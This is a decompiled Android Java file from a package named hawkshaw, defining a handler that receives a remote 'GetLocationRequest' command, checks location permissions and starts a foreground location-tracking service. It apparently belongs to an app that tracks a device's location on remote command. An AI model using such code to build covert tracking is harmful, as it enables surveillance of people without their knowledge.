package com.hawkshaw.library.features.location;

import F3.b;
import android.content.Intent;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;

public final class HandlerKt {
    private static final String TAG = "LocationHandler";

    public static final void pushLocation(Command.GetLocationRequest getLocationRequest) {
        if (getLocationRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION")) {
                Logger.e$default(Logger.INSTANCE, TAG, "PushLocation: You don't have location permissions", (Exception) null, false, 12, (Object) null);
                return;
            }
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), ForegroundLocationService.class);
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            intent.putExtra(ForegroundLocationService.KEY_LOCATION_REQUEST, json.b(Command.GetLocationRequest.Companion.serializer(), getLocationRequest));
            companion.getContext().startForegroundService(intent);
        }
    }
}
